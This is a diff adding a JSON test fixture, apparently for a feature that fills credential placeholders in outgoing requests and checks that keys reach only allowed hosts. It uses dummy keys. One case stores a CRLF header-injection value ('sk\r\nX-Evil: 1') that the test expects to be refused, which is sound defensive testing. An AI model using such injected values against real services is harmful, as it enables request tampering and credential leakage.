+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "url": "http://ha.local:8123/api/states/sensor.t",
+      "headers": {
+        "Authorization": "Bearer {{key:homeAssistant.accessToken}}"
+      },
+      "expect": {
+        "url": "http://ha.local:8123/api/states/sensor.t",
+        "headers": {
+          "Authorization": "Bearer ha-token"
+        }
+      }
+    },
+    {
+      "name": "hostsFrom: another port is another origin",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "url": "http://ha.local:9999/api",
+      "headers": {
+        "Authorization": "Bearer {{key:homeAssistant.accessToken}}"
+      },
+      "refused": "host"
+    },
+    {
+      "name": "undeclared: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [],
+      "url": "https://api.openai.com/v1/images",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "refused": "undeclared"
+    },
+    {
+      "name": "refused scene: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "store-art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/v1/images",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "refused": "missing"
+    },
+    {
+      "name": "no serviceKeys: any host (a frame with no plane)",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "x",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://proxy.example.com/v1",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "expect": {
+        "url": "https://proxy.example.com/v1",
+        "headers": {
+          "Authorization": "Bearer sk-default"
+        }
+      }
+    },
+    {
+      "name": "no placeholder: untouched",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [],
+      "url": "https://example.com/?a={{b}}",
+      "headers": {
+        "A": "x"
+      },
+      "expect": {
+        "url": "https://example.com/?a={{b}}",
+        "headers": {
+          "A": "x"
+        }
+      }
+    },
+    {
+      "name": "a value is encoded in a query",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "a b&c"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/?k={{key:openAI.apiKey}}",
+      "headers": {
+        "Authorization": "{{key:openAI.apiKey}}"
+      },
+      "expect": {
+        "url": "https://api.openai.com/?k=a%20b%26c",
+        "headers": {
+          "Authorization": "a b&c"
+        }
+      }
+    },
+    {
+      "name": "a header a redirect would carry elsewhere: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/v1/images",
+      "headers": {
+        "X-Key": "{{key:openAI.apiKey}}"
+      },
+      "refused": "header"
+    },
+    {
+      "name": "a control character in a header value: refused",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk\r\nX-Evil: 1"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "url": "https://api.openai.com/v1/images",
+      "headers": {
+        "Authorization": "Bearer {{key:openAI.apiKey}}"
+      },
+      "refused": "value"
+    },
+    {
+      "name": "a typed address is where its typed token may go",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "typedKeys": {
+        "homeAssistant": {
+          "url": "http://elsewhere.example:8123",
+          "accessToken": "typed-token"
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "url": "http://elsewhere.example:8123/api/states",
+      "headers": {
+        "Authorization": "Bearer {{key:homeAssistant.accessToken}}"
+      },
+      "expect": {
+        "url": "http://elsewhere.example:8123/api/states",
+        "headers": {
+          "Authorization": "Bearer typed-token"
+        }
+      }
+    },
+    {
+      "name": "a typed address alone has no token to send",
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "typedKeys": {
+        "homeAssistant": {
+          "url": "http://elsewhere.example:8123"
+        }
+      },
+      "scene": "ha",
+      "declared": [
+        "homeAssistant"
+      ],
+      "url": "http://elsewhere.example:8123/api/states",
+      "headers": {
+        "Authorization": "Bearer {{key:homeAssistant.accessToken}}"
+      },
+      "refused": "missing"
+    }
+  ]
+}
